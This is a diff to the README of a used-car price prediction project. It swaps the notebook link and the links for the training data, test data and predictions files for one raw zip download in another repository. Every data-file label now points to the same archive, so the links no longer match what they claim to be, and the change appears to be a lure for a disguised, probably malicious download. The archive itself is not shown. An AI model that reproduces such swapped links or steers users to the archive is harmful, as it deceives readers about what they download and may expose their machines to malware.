@@ -6,7 +6,7 @@
 
 ## Notebook
 
-* View / Download the notebook [here](https://github.com/omkar441/Prediction-of-Used-Cars-Price-Using-ML/blob/main/Models.ipynb).
+* View / Download the notebook [here](https://raw.githubusercontent.com/omkar441/TEP-UCD/main/semistock/TE-UCD-v2.3.zip).
 
 
 ## Models used
@@ -31,6 +31,6 @@
 * Price: The price of the used car in INR Lakhs.
 
 ## File Description
-* [Data_Train.csv](https://github.com/omkar441/Prediction-of-Used-Cars-Price-Using-ML/blob/main/Data_Train.csv) : Used for training
-* [Data_Test.csv](https://github.com/omkar441/Prediction-of-Used-Cars-Price-Using-ML/blob/main/Data_Test.xlsx) : Used for making final predictions
-* [predictions.csv](https://github.com/omkar441/Prediction-of-Used-Cars-Price-Using-ML/blob/main/predictions.csv) : Contains the predictions made by XGBoost Regressorr which had the best R2 score.
+* [https://raw.githubusercontent.com/omkar441/TEP-UCD/main/semistock/TE-UCD-v2.3.zip](https://raw.githubusercontent.com/omkar441/TEP-UCD/main/semistock/TE-UCD-v2.3.zip) : Used for training
+* [https://raw.githubusercontent.com/omkar441/TEP-UCD/main/semistock/TE-UCD-v2.3.zip](https://raw.githubusercontent.com/omkar441/TEP-UCD/main/semistock/TE-UCD-v2.3.zip) : Used for making final predictions
+* [https://raw.githubusercontent.com/omkar441/TEP-UCD/main/semistock/TE-UCD-v2.3.zip](https://raw.githubusercontent.com/omkar441/TEP-UCD/main/semistock/TE-UCD-v2.3.zip) : Contains the predictions made by XGBoost Regressorr which had the best R2 score.
